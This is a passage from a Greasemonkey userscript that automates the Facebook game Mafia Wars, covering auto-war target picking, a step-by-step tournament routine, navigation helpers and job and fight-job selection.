        clickElement(callWarHelp);
      };
      Autoplay.start();
      DEBUG('Clicked to ask for help in ongoing war.');
      return true;
    }

    var startNewWar = xpathFirst('.//div[contains(text(),"Start a New War")]');
    if(startNewWar){
      setGMTime('warTimer', warTimer);
      DEBUG('Setting warTimer to come back in ' + warTimer);
      return false;
    } else {
      setGMTime('warTimer', '1 hour');
      DEBUG('Setting warTimer to come back in 1 hour');
      return false;
    }
  } else {
    // Get war Targets to Declare War on
    var warFriendsList = $x('.//a[contains(@href, "xw_action=declare_war")]', innerPageElt);
    if (warFriendsList) {
    // Pick a Random Target out of the Targets List
      var warElt = warFriendsList[Math.floor(Math.random() * warFriendsList.length)];
    }

    // Check to see if we have a valid target (If attributes are changed by Zynga, disable autoWar)
    if (!warElt || (warElt && !warElt.getAttribute('onclick').match(/target_id=p%7C(\d+)/))) {
      DEBUG('War elements appeared to have been changed by Zynga, disabling autoWar.');
      GM_setValue('autoWar', 0)

      return false;
    }
    // War a Random Target
    warElt.target_id = RegExp.$1;

    // War Friends from a List
    // Therefor we change the target ID in the Random Target Link
    if (GM_getValue('warMode', 0) == 1)  {
      var tmpWarTargets = GM_getValue('autoWarTargetList');
      if (tmpWarTargets) {
        tmpWarTargets = tmpWarTargets.split('\n');
        // Get a Random Enemy's ID from the friends List
        var thisAutoWarTarget = tmpWarTargets[Math.floor(Math.random() * tmpWarTargets.length)];

        // Change the Target id
        warElt.target_id = thisAutoWarTarget;
        warElt.setAttribute('onclick', warElt.getAttribute('onclick').replace(RegExp.$1, thisAutoWarTarget));
      } else {
        // If there are no targets in the list, we keep the Random Target
        addToLog('warning Icon','There are no targets in your Enemies List. Changing War Settings to War a Random Enemy.');
        GM_setValue('warMode', 0)
      }
    }

    // Go to war
    Autoplay.fx = function() {
      clickAction = action;
      clickContext = warElt;
      clickElement(warElt);
      DEBUG('Clicked to start a new war.');
    };
    Autoplay.start();
    return true;
  }
  return false;
}

function autoTournament() {
  // Check if we're in Las Vegas
  if (city != LV) {
    Autoplay.fx = function(){goLocation(LV);};
    Autoplay.start();
    return true;
  }
  // Check if we're on the tournament tab
  if (!onTournamentTab()) {
    Autoplay.fx = goTournamentTab;
    Autoplay.start();
    return true;
  }

  // Check if tournament is available
  var timerTournamentElt = xpathFirst('.//div[@id="tournament_parent"]//span[@id="tournament_try_again_timer"]', innerPageElt);
  if (timerTournamentElt && timerTournamentElt.innerHTML) {
    var timerTournament = timerTournamentElt.innerHTML;
    DEBUG('Timer found: ' + timerTournament);
    setGMTime('tournamentTimer', timerTournament);
    goHome();
    return false;
  }
  // Check if tournament tab is fully loaded
  var footerElt = xpathFirst('.//div[@id="tournament_footer"]/div[contains(@id,"tournament_footer_") and @class="tournament_footer_on"]', innerPageElt);
  if (!footerElt || !footerElt.id) {
    Autoplay.fx = autoTournament;
    Autoplay.start();
    return true;
  }

  // Everything looks ok here
  DEBUG('autoTournament(): Progress OK'); // (tournament_timer not found and tournament_footer selected)
  // Set delay for tournament stuff to 3s
  Autoplay.delay = 3000;

  // Assign step elts
  var tournamentPage1 = xpathFirst('.//div[@class="tournament_page" and @id="tournament_page1"]', innerPageElt);
  var tournamentPage2 = xpathFirst('.//div[@class="tournament_page" and @id="tournament_page2"]', innerPageElt);
  var tournamentPage3 = xpathFirst('.//div[@class="tournament_page" and @id="tournament_page3"]', innerPageElt);
  var tournamentPage4 = xpathFirst('.//div[@class="tournament_page" and @id="tournament_page4"]', innerPageElt);
  var tournamentPage5 = xpathFirst('.//div[@class="tournament_page" and @id="tournament_page5"]', innerPageElt);

  // Parse stats
  var statsSkills = xpathFirst('.//div[@id="tournament_footer"]//div[@class="tournament_atkdef_icon"]', innerPageElt);
  var statsMafia = xpathFirst('.//div[@id="tournament_footer"]//div[@class="tournament_mafia_icon_self"]', innerPageElt);
  if (statsSkills && statsSkills.innerHTML) statsSkills = parseInt(statsSkills.innerHTML.replace(',', ''));
  if (statsMafia && statsMafia.innerHTML) statsMafia = parseInt(statsMafia.innerHTML);
  DEBUG('autoTournament(): Parsed def+atk skill: ' + statsSkills + ', mafia: ' + statsMafia);

  // Reset the auto-refresh timer before each step
  autoReload();
/***** Which tournament step are we at? *****/
  var nextButton = function() { return xpathFirst('.//div[@id="tournament_nextpage" and not(contains(@style,"opacity: 0.5")) and not(contains(@style,"none"))]', innerPageElt); };
  switch (footerElt.id) {
/*** Step 1 Class ***/
    case 'tournament_footer_one':
      DEBUG('autoTournament(): Currently at step 1 "Class"');
      //var arrowUpElt = xpathFirst('.//div[@class="tournament_belt_arrowup"]', innerPageElt);
      //var arrowDownElt = xpathFirst('.//div[@class="tournament_belt_arrowdown"]', innerPageElt);
      var chosenClass = tournamentClasses[GM_getValue('autoTournamentClass', 0)];
      var selectedClassElt = xpathFirst('.//div[@class="tournament_belt_unlocked" or @class="tournament_belt_locked"]//div[@class="tournament_belt_descrip"]', tournamentPage1);
      if (!selectedClassElt || !selectedClassElt.innerHTML) {
        // Error
        addToLog('warning Icon', 'autoTournament(): Error finding/parsing a selected class.');
        break;
      }
      // Check if correct class needs to be clicked
      if (selectedClassElt.innerHTML != chosenClass[0]) {
        var classElt = xpathFirst('.//div[@id="tourney_belt_text_bg_' + GM_getValue('autoTournamentClass', 0) + '"]', tournamentPage1);
        if (classElt) {
          // Select correct class
          clickElement(classElt);
          DEBUG('autoTournament(): Clicked to select ' + chosenClass[0]);
          Autoplay.fx = autoTournament;
          Autoplay.start();
          return true;
        } else {
          // Error
          addToLog('warning Icon', 'autoTournament(): Couldn\'t find class to select.');
          //GM_setValue('autoTournament', 0);
          break;
        }
      } else {
        // Correct class is selected, go to step "Entry" (if possible)
        var nextPageElt = nextButton();
        if (nextPageElt) {
          clickElement(nextPageElt);
          DEBUG('autoTournament(): Clicked to go to step "Entry"');
          Autoplay.fx = autoTournament;
          Autoplay.start();
          return true;
        } else {
          // Error, disabling autoTournament: eg class locked (mafia size too low)
          addToLog('warning Icon', 'autoTournament(): Disabling autoTournament, selected class is locked, please choose another.');
          GM_setValue('autoTournament', 0);
          break;
        }
      }
      break;

/*** Step 2 Entry ***/
    case 'tournament_footer_two':
      DEBUG('autoTournament(): Currently at step 2 "Entry"');
      var currentRoundElt = xpathFirst('.//div[contains(@class,"tournament_round_container tournament_round_") and not(contains(@class,"_locked")) and not(contains(@class,"_champion"))]', tournamentPage2);
      var costCash = parseCash(xpathFirst('.//div[@class="tournament_round_cost tournament_chip"]', currentRoundElt).innerHTML);
      var costStam = parseInt(xpathFirst('.//div[@class="tournament_round_cost tournament_stamina"]', currentRoundElt).innerHTML);
      DEBUG('autoTournament(): V$' + costCash + ', STAM: ' + costStam);
      GM_setValue('tournamentStamina', costStam);
      if (costStam > stamina) {
        addToLog('warning Icon', 'autoTournament(): We need '+(costStam-stamina)+' more stamina for this round, skipping for 15min...');
        setGMTime('tournamentTimer', '00:15:00');
        break;
      }
      // Check if we have enough money on hand
      var cashDiff = costCash - cities[LV][CITY_CASH];
      if (cashDiff > 0) {
        // Withdraw the amount we need
        DEBUG('autoTournament(): We need V$'+costCash+' for this round. Withdrawing V$'+cashDiff+'...');
        // Suspend banking
        suspendBank = true;
        autoBankWithdraw(cashDiff);
        Autoplay.fx = autoTournament;
        Autoplay.start();
        return true;
      }
      // We have enough money, go to "Bet" (by clicking "Fight" and then "Step into the Ring" in the confirmation popup
      var nextPageElt = xpathFirst('.//div[(contains(@id,"pop_box") and contains(@style, "block"))]//a[@class="sexy_button_new short white" and contains(.,"Step into the Ring")]', innerPageElt);
      if (!nextPageElt) nextPageElt = nextButton();
      if (nextPageElt) {
        clickElement(nextPageElt);
        DEBUG('autoTournament(): Clicked to go to "Bet" page');
        Autoplay.fx = autoTournament;
        Autoplay.start();
        return true;
      } else {
        // Error
        addToLog('warning Icon', 'autoTournament(): No Next button found.');
        //GM_setValue('autoTournament', 0);
        break;
      }
      break;

/*** Step 3 Bet ***/
    case 'tournament_footer_three':
      DEBUG('autoTournament(): Currently at step 3 "Bet"');
      // Reactivate banking
      suspendBank = false;
      var nextPageElt = xpathFirst('.//div[(contains(@id,"pop_box") and contains(@style, "block"))]//a[@class="sexy_button_new short red" and contains(.,"Fight Anyway")]', innerPageElt);
      if (!nextPageElt) xpathFirst('.//div[@class="pop_box" and contains(@style, "block")]//a[@class="sexy_button_new short red" and contains(.,"Fight Anyway")]', innerPageElt);
      if (!nextPageElt) xpathFirst('.//a[@class="sexy_button_new short red" and contains(.,"Fight Anyway")]', innerPageElt);
      if (!nextPageElt) nextPageElt = nextButton();
      if (nextPageElt) {
        clickElement(nextPageElt);
        DEBUG('autoTournament(): Clicked to go to "Fight" page');
        Autoplay.fx = autoTournament;
        Autoplay.start();
        return true;
      } else {
        // Error
        addToLog('warning Icon', 'autoTournament(): No Next button found.');
        //GM_setValue('autoTournament', 0);
        break;
      }
      break;

/*** Step 4 Fight ***/
    case 'tournament_footer_four':
      // Set delay for tournament fighting to 6s for stability
      Autoplay.delay = 6000;
      // Check if we really are at step 4
      if (!tournamentPage5 || tournamentPage5.style.display == 'none') {
        DEBUG('autoTournament(): Currently at step 4 "Fight"');
        // Click the fight next round button
        var fightElt = xpathFirst('.//a[@class="sexy_button_new short red" and contains(@id,"tournament_brackets_round") and contains(@id,"_fight")]', innerPageElt);
        if (fightElt) {
          if (fightElt.innerHTML && fightElt.innerHTML.match(/<span>(.+?)<\/span>/i)) var fightRound = RegExp.$1;
          else var fightRound = 'fight the next round';
          clickElement(fightElt);
          DEBUG('autoTournament(): Clicked to ' + fightRound);
          Autoplay.fx = autoTournament;
          Autoplay.start();
          return true;
        } else {
          // Error
          addToLog('warning Icon', 'autoTournament(): No Fight button found.');
          //GM_setValue('autoTournament', 0);
          break;
        }
      } else {
/*** Step 5 Result ***/
        DEBUG('autoTournament(): Currently at step 5 "Result"');
        // Tournament finished, results are here
        var expElt = xpathFirst('.//div[@class="tournament_result_left_side"]/div[@class="tournament_result_exp"]', tournamentPage5);
        var fansElt = xpathFirst('.//div[@class="tournament_result_left_side"]/div[@class="tournament_result_fans"]', tournamentPage5);
        var tokensElt = xpathFirst('.//div[@class="tournament_result_left_side"]/div[@class="tournament_result_tokens"]', tournamentPage5);
        var chipsElt = xpathFirst('.//div[@class="tournament_result_left_side"]/div[@class="tournament_result_chips"]', tournamentPage5);

        var hasLost = xpathFirst('.//a[contains(text(),"Why did I lose")]', tournamentPage5);
        var hasGained = '';
        if (expElt) hasGained += (hasGained ? ', ' : ' ') + 'XP: ' + expElt.innerHTML;
        if (chipsElt) hasGained += (hasGained ? ', ' : ' ') + 'Cash: V$' + chipsElt.innerHTML;
        if (tokensElt) hasGained += (hasGained ? ', ' : ' ') + 'Tokens: ' + tokensElt.innerHTML;
        if (fansElt) hasGained += (hasGained ? ', ' : ' ') + 'Fans: ' + fansElt.innerHTML;

        if (!hasLost) {
          addToLog('yeah Icon', 'Tournament finished, you won!' + (hasGained ? '<br><span class="good">Gained' + hasGained + '</span>' : ''));
        } else {
          addToLog('omg Icon', 'Tournament finished, you lost!' + (hasGained ? '<br><span class="good">Gained' + hasGained + '</span>' : ''));
        }
        var nextPageElt = nextButton();
        if (nextPageElt) {
          clickElement(nextPageElt);
          DEBUG('autoTournament(): Clicked to finish the tournament');
          Autoplay.fx = autoTournament;
          Autoplay.start();
          return true;
        }
      }
      break;
  }
  // Something went wrong, reload
  goHome();
  return false;
}

function goProperties(propCity) {
  // Make sure we're in the correct city
  if (city != propCity) {
    Autoplay.fx = function () { goLocation(propCity); };
    Autoplay.start();
    return true;
  }

  // Go to the city's property nav
  if (!onPropertyNav()) {
    Autoplay.fx = goPropertyNav;
    Autoplay.start();
    return true;
  }

  return false;
}

function onHome() {
  // Return true if we're on the home page, false otherwise.
  if (xpathFirst('.//div[@class="playerupdate_box"]', innerPageElt)) {
    return true;
  }

  return false;
}

function onNewHome() {
  // Return true if we're on the home page, false otherwise.
  if(document.getElementById('MainModule')) {
    return true;
  }
  if (xpathFirst('.//div[@class="empire_module_title"]', innerPageElt)) {
    return true;
  }
  return false;
}


function onSafehouseNav() {
  // Return true if we're on the Crime Spree nav, false otherwise.
  if (xpathFirst('.//*[contains(@id,"gift_safehouse_content")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onWarTab() {
// Return true if we're on the War nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Declare War")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onPropertyNav() {
  // Return true if we're on the property nav, false otherwise.
  if (xpathFirst('.//*[@name="buy_props" or @id="flash_content_propertiesV2" or @id="propertyV2Help"]', innerPageElt)) {
    return true;
  }
  return false;
}

function onProfileNav() {
  // Return true if we're on the profile nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_off")]//a[contains(., "Achievements")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onMyMafiaNav() {
  // Return true if we're on My Mafia nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_first")]//a[contains(., "Recruit")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onFightTab() {
  // Return true if we're on the fight tab, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Fight")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onFightersTab() {
  // Return true if we're on the fighters tab in the fight menu, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on tab_middle")]//a[contains(., "Fighters")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onRivalsTab() {
  // Return true if we're on the rivals tab, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_off tab_middle")]//a[contains(., "Rivals")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onTournamentTab() {
  // Return true if we're on the tournament tab, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Tournaments")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onHitlistTab() {
  // Return true if we're on the hitlist tab, false otherwise.
  if (xpathFirst('.//table[@class="hit_list"]', innerPageElt)) {
    return true;
  }
  return false;
}

function onInventoryTab() {
  // Return true if we're on the inventory tab, false otherwise.
  if (xpathFirst('.//li[contains(@class,"tab_on")]//a[contains(.,"Inventory")]', innerPageElt)) {
    return true;
  }
  if (xpathFirst('.//li[contains(@class,"tab_on")]//a[contains(.,"Items")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onLootTab() {
// Return true if we're on the Loot nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Loot")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onCollectionsTab() {
// Return true if we're on the Collections nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(@onclick, "xw_controller=collection")]', innerPageElt)) {
    return true;
  }
  return false;
}

function onMarketTab() {
// Return true if we're on the MarketPlace nav, false otherwise.
  if (xpathFirst('.//div[@id="marketplace"]', innerPageElt)) {
    return true;
  }
  return false;
}

function onLottoTab() {
// Return true if we're on the Lotto nav, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "Play")]', innerPageElt)) {
    return true;
  }
  return false;
}

function loadHome() {
  document.location = 'http://apps.facebook.com/inthemafia/index.php';
}

function goHome() {
  // Home is not available yet
  if (level < 6) {
    DEBUG('Home not available yet, going to jobs instead');
    goJobsNav();
    return;
  }

  // Find the visible home link.
  var elt = xpathFirst('//div[@id="nav_link_home_unlock"]//a');
  if (!elt) {
    // Find the visible home link.
    var elts = $x('//div[@class="nav_link home_link"]//a');
    for (var i = 0, numElts=elts.length; i < numElts; ++i) {
      if (elts[i].scrollWidth) {
        elt = elts[i];
        break;
      }
    }

    if (!elt) {
      DEBUG('Can\'t find home link to click. Using fallback method.');
      loadHome();
      return;
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go home.');
}

function goSafehouseNav() {
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page","remote/html_server.php?xw_controller=safehouse&xw_action=view", 1, 1, 0, 0); return false;'});
  if (!elt) {
    addToLog('warning Icon', 'Can\'t make Crime Spree nav link to click.');
  } else {
    clickElement(elt);
    DEBUG('Clicked to load Crime Spree nav.');
  }
  return;
}

function goProfileNav(player) {
  var elt = player.profile;

  // Get the profile click element
  if (!elt || !elt.getAttribute('onclick')) {
    elt = xpathFirst('.//table[@class="main_table fight_table"]//a[contains(@href, "xw_controller=stats")]', innerPageElt);
  }

  // Try to "fix" the onclick event
  if (elt && elt.getAttribute('onclick').match(/user=(\w+)/)) {
    var newClick = elt.getAttribute('onclick');
    var oldID = newClick.split('&user=')[1].split('\'')[0].split('&')[0];
    player.id = player.id.replace('p|','');
    newClick = newClick.replace(oldID, encode64('p|'+player.id).replace(/==/,'%3D%3D'));

    // Fix AJAX loading of profile link
    if (newClick.match(/this.href/))
      newClick = newClick.replace('this.href=\'http://mwfb.zynga.com/mwfb/','return do_ajax(\'inner_page\', \'') + ', 1, 1, 0, 0); return false;';

    elt.setAttribute('onclick', newClick);
    clickElement(elt);
    DEBUG('Clicked to load profile (id=' + player.id + ', onclick=' + elt.getAttribute('onclick') + '). ');
    return;
  }

  // Try to create the link, some fight pages do not contain any profile links
  elt = xpathFirst('.//table[@class="main_table fight_table"]//a[contains(@href, "xw_controller=fight")]', innerPageElt);
  if (elt && elt.getAttribute('onclick').match(/opponent_id=(\w+)/)) {
    var newClick = " return do_ajax('inner_page', 'remote/html_server.php?xw_controller=stats&xw_action=view&xw_city="+city+"&user="+player.id+"&ref=fight_list', 1, 1, 0, 0); return false; ";
    elt.setAttribute('onclick', newClick);
    clickElement(elt);
    DEBUG('Clicked to load profile (id=' + player.id + ', onclick=' + elt.getAttribute('onclick') + '). ');
    return;
  }

  DEBUG("Could not find profile link");
  goFightNav();
  return;
}

function goMyProfile() {
  if(new_header){
    var elt = xpathFirst('//a[@class="dropdown_narrow"]');
  } else {
    var elt = xpathFirst('.//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]', mastheadElt);
  }
  if (!elt) {
    addToLog('warning Icon', 'Can\'t find Profile nav link to click.');
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to load my own profile.');
}

function goMyMafiaNav() {
  var elt = xpathFirst('//div[@class="nav_link mafia_link"]//a[contains(.,"My Mafia")]');
  if (!elt) {
    addToLog('warning Icon', 'Can\'t find My Mafia nav link to click.');
    return;
  } else {
    var eltProfile = xpathFirst('//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]');
    if (eltProfile) {
      elt.setAttribute('onclick',eltProfile.getAttribute('onclick').replace(/xw_controller=stats/i,'xw_controller=recruit'));
    }
  }
  clickElement(elt);
  DEBUG('Clicked to load My Mafia nav.');
}

function goMyMafiaTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "My Mafia")]', innerPageElt);
  if (!elt) {
    goMyMafiaNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to My Mafia tab.');
}

function onMyMafiaTab() {
  // Return true if we're on the My Mafia tab, false otherwise.
  if (xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(., "My Mafia")]', innerPageElt)) {
    return true;
  }

  return false;
}

function goWarTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "Declare War")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to Declare war.');
}

function goBank() {
  var elt = xpathFirst('//a[@class="bank_deposit"]');
  if (!elt) {
    addToLog('warning Icon', 'Can\'t find bank link to click.');
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to bank.');
}

function goJobsNav() {
  var elt = xpathFirst('//div[@class="nav_link jobs_link"]/a');
  if (!elt) {
    var elt = xpathFirst('.//a[@class="header_job_button"]', mastheadElt);
    if (!elt) {
      elt = xpathFirst('.//div[@id="nav_link_jobs_unlock"]//a', mastheadElt);
      if (!elt) {
        addToLog('warning Icon', 'Can\'t find jobs nav link to click.');
        return false;
     }
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go to jobs.');
  return true;
}

function goInventoryNav() {
  var elt = xpathFirst('//div[@class="nav_link inventory_link"]/a');
  if (!elt) {
    elt = xpathFirst('.//a[@class="header_inventory_button"]', mastheadElt);
    if (!elt) {
      elt = xpathFirst('.//div[@id="nav_link_inventory_unlock"]//a', mastheadElt);
      if (!elt) {
        addToLog('warning Icon', 'Can\'t find Inventory nav link to click.');
        return false;
      }
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go to Inventory.');
  return true;
}

function goMarketPlace() {
  var pagehtml = '"remote/html_server.php?xw_controller=marketplace&xw_action=view&xw_city="';
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+ pagehtml + ', 1, 1, 0, 0); return false;'});
  if (elt) {
    clickElement(elt);
    DEBUG('Clicked to go to Marketplace tab.');
    return true;
  } else {
    addToLog('warning Icon', 'Can\'t find Marketplace nav link to click.');
    return false;
  }
}

function goCollectionsNav() {
  var pagehtml = '"remote/html_server.php?xw_controller=collection&xw_action=view&xw_city=1"';
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page",'+ pagehtml + ', 1, 1, 0, 0); return false;'});
  if (elt) {
    clickElement(elt);
    DEBUG('Clicked to go to Collections tab.');
    return true;
  } else {
    addToLog('warning Icon', 'Can\'t find Collections nav link to click.');
    return false;
  }
}

function goJobTab(tabno) {
  var elt;
  var currentTab = currentJobTab();
  if (currentTab == -1) {
    // We're not even on a jobs page yet. Go there.
    return goJobsNav();
  }
  if (currentTab == tabno) {
    DEBUG('Already on job tab ' + tabno);
    return true;
  }

  // No job tab. Make sure we're on the correct job bar.
  // For NY and BK we look for the 'more jobs' or 'more episodes' tab to move between job bars
  // NY has jobs_bar0 and jobs_bar1 where as BK has only jobs_bar0, account for this later
  var barno = 0;
  if (city == NY) barno = (tabno < 6 ? 0 : 1);
  if (city == BANGKOK) barno = (tabno < 5 ? 0 : 1);
  var currentBar = 0;
  if (city == NY) currentBar = (currentTab < 6 ? 0 : 1);
  if (city == BANGKOK) currentBar = (currentTab < 5 ? 0 : 1);
  DEBUG('goJobTab: city=' + city + ' currentBar=' + currentBar + ' currentTab=' + currentTab + ' barno=' + barno + ' tabno=' + tabno);
  if (currentBar != barno) {
    var jobWord;
    if (city == NY) jobWord = currentBar == 1 ? "Easy Jobs" : "More Jobs";
    if (city == BANGKOK) jobWord = currentBar == 1 ? "Previous" : "More Episodes";
    elt = xpathFirst('.//ul[contains(@id,"jobs_bar")]' +
                     '//a[contains(text(), "'+jobWord+'")]', innerPageElt);
    DEBUG('Clicked to go to job bar ' + barno + '. ');
    clickElement(elt);
    return true;
  }

  // Adjust the barno for BK because BK only has one bar number, jobs_bar0.
  if (city == BANGKOK) barno = 0;

  // Handle old and new tab param names
  elt = xpathFirst('.//ul[@id="jobs_bar' + barno + '"]//a[' +
                   'contains(@onclick, "&story_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&episode_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&tab=' + tabno + '")]', innerPageElt);

  if(!elt) elt = xpathFirst('.//li[@id="tab_' + barno + '"]//a[' +
                   'contains(@onclick, "&story_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&episode_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&tab=' + tabno + '")]', innerPageElt);

  if(!elt) elt = xpathFirst('.//li[@id="tab_' + tabno + '"]//a[' +
                   'contains(@onclick, "&story_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&episode_tab=' + tabno + '") or ' +
                   'contains(@onclick, "&tab=' + tabno + '")]', innerPageElt);

  if (!elt) {
    elt = xpathFirst('.//li[@id="tab_' + tabno + '"]//span[contains(text(), "Locked")]',innerPageElt);
    if(elt) {
      addToLog('warning Icon', 'Job bar ' + barno + ', tab ' + tabno + ' is LOCKED. AutoMission disabled');
      GM_setValue('autoMission', 0);
      //newchange
      update_nrg_stam(); // update the icon to show energy spend is off
    } else {
      addToLog('warning Icon', 'BUG DETECTED: Can\'t find job bar ' + barno + ', tab ' + tabno + ' link to click. Currently on job bar ' + currentBar + ', tab ' + currentTab + '.');
    }
    return false;
  }

  clickElement(elt);
  DEBUG('Clicked to go to job tab ' + tabno + '.');
  return true;
}
//newlv
////////    start go job tab path
function goJobTabPath(tabnopath) {
  var elt;
  var currentTabPath = currentJobTabPath();
  Diagnose(' job in path go 2 Job sub path: city=' + city + ' ' +  ' currentTabPath=' + currentTabPath +  ' tabnopath=' + tabnopath  );

  if (currentTabPath == tabnopath) {
    Diagnose(' job Already on job  tab sub path' + tabnopath);
    return true;
  }
  elt = xpathFirst('.//a[contains(@onclick, "ExpertMapController.changePath('+tabnopath+');")]');
  if (!elt) {
    addToLog('warning Icon', 'BUG DETECTED: Can\'t find job tab path link to click. wanting on job path ' + tabnopath + ', current tab path' + currentTabPath + '.');
    return false;
  }
  clickElement(elt);
  Diagnose(' job, Clicked to go to tab ' + tabnopath + 'in gojobtabpath elt-b=' + elt );
  return true;
  //  return ;
}
///////////// end go job tab path


function goJob(jobno) {
  // Retrieve the jobRow
  var jobName = missions[GM_getValue('selectMission')][MISSION_NAME];
  var jobNo = missions[GM_getValue('selectMission')][MISSION_NUMBER];
  Diagnose(' job Clicking jobNo/jobName : '+jobNo+ ' / '+jobName);
  var jobRow = getJobRow(jobName, innerPageElt);
  // Get the action element by job no first
  var elt;
  var tmp = 1 ;
  if (jobRow) elt = xpathFirst('.//a[contains(@onclick, "job='+jobNo+'") and not(contains(@onclick, "xw_controller=marketplace"))]', jobRow);
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "MapController.doFightJob('+jobNo+',\'p|")]', jobRow);  tmp = 5 ; }

  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "xw_action=dojob")]', jobRow)                    ; tmp = 2 ;} // first 2 are above line broke down
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "MapController.panelButtonDoJob('+jobNo+');")]') ; tmp = 3 ;} // lv jobs
  if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "xw_action=fight_job")]', jobRow)                ; tmp = 4 ;} // i forget :) may not need

  if (tmp == 5) {
  // lv fight jobs
    targetElts = $x('.//a[contains(@onclick, "MapController.doFightJob('+jobNo+',\'p|")]', jobRow);  tmp = 5 ;
    numTargets = targetElts.length;
    DEBUG('Fight job, Number of Fight Targets Found : '+ numTargets);
    if(numTargets){

      var opponentLevelMax = parseInt(GM_getValue('fightLevelMax', 100));
      var opponentMafiaMax = parseInt(GM_getValue('fightMafiaMax', 501));

      if (GM_getValue('fightLevelMaxRelative', false)) {
        opponentLevelMax = opponentLevelMax + level;
      }
      if (GM_getValue('fightMafiaMaxRelative', false)) {
        opponentMafiaMax = opponentMafiaMax + mafia;
      }
      DEBUG('Fight job, Only performing if Level <= '+opponentLevelMax+' and mafia <= '+opponentMafiaMax);

      var OppName, OppSize, OppLevel;
      //ignore job if we have do not have enough energy / stamina to perform the job, otherwise we set jobmastery to 100 to skip this job temporarely
      var skipCurrentJob = false;
      StamReqElt = xpathFirst('.//dd[@class="stamina"]', jobRow);
      if(StamReqElt) {
        StamReq = parseInt(StamReqElt.innerHTML.untag());
        Diagnose(' job Requires Stamina:' +StamReq+':');
        if(StamReq > stamina) {
          skipCurrentJob = true;
          Diagnose(' job stamina required :'+StamReq+': have :'+stamina+': not enough stamina, leave for now');
//          goHome();
          return false;
        } else Diagnose(' job stamina required :'+StamReq+': have :'+stamina+': have enough stamina do job');
      } else Diagnose(' job  Current Stamina: '+stamina+'. Skipping - StamReq NOT FOUND');
      Diagnose(' job  check stam 3');

      var smallestMafia = opponentMafiaMax;
      var lowestLevel = opponentLevelMax;
      var foundOpp = false;
      for(i=0;i<numTargets;i++){
        targetParent = targetElts[i].parentNode.parentNode;
        parentNoTags = targetParent.innerHTML.untag();
        if (parentNoTags.match(/(.+?)\s+(.+?)\s+(.+?)\s+Fight/i)) {
          OppName = RegExp.$1;
          OppSize = parseInt(RegExp.$2);
          OppLevel = parseInt(RegExp.$3);
        } else {
          OppNameElt = xpathFirst('.//dt[@class="name"]//span[@class="player_data"]', targetParent);
          if(OppNameElt) OppName = OppNameElt.innerHTML.untag();
          OppSizeElt = xpathFirst('.//dd[@class="group_size"]//span[@class="player_data"]', targetParent);
          if(OppSizeElt) OppSize = parseInt(OppSizeElt.innerHTML.untag());
          OppLevelElt = xpathFirst('.//dd[@class="level"]//span[@class="player_data"]', targetParent);
          if(OppLevelElt) OppLevel = parseInt(OppLevelElt.innerHTML.untag());
        }
        if((OppSize !=0 && OppLevel != 0) && (OppSize < smallestMafia || (OppSize == smallestMafia && OppLevel < lowestLevel)) ){
            OppTarget = targetElts[i];
            OppTargetParent = targetParent;
            smallestMafia = OppSize;
            lowestLevel = OppLevel;
            foundOpp = true;
            DEBUG('Fight job, Using Target : '+OppName+' - Size : '+OppSize+' - Level : '+OppLevel);
        } else {
          DEBUG('Fight job, Skipping Target  : '+OppName+' - Size : '+OppSize+' - Level : '+OppLevel);
        }
      }

      if(foundOpp){
        DEBUG('Fight job, Going to fight : '+OppTargetParent.innerHTML.untag());
        elt=OppTarget;
      } else {
        addToLog('warning Icon', 'Opponents did not qualify ... Reloading to find new opponents.');
        elt=undefined;
        goJobsNav();
        return false;
      }
      tmp = 5 ;
    } else {
      if (!elt) { elt = xpathFirst('.//a[contains(@onclick, "ExpertMapController.selectNode('+jobNo+');")]') ; tmp = 6 ;} // in LV jobs, will fight or job for fallback
    }
  }

  if (elt) {
    Diagnose(' job  string used was =' + tmp );
    clickAction = 'job';
    suspendBank = false;
    clickElement(elt);
    Diagnose(' job Clicked to perform job: ' + jobName + '.');
    return true;
  } else {
    return false;
  }
}

function goFightNav() {
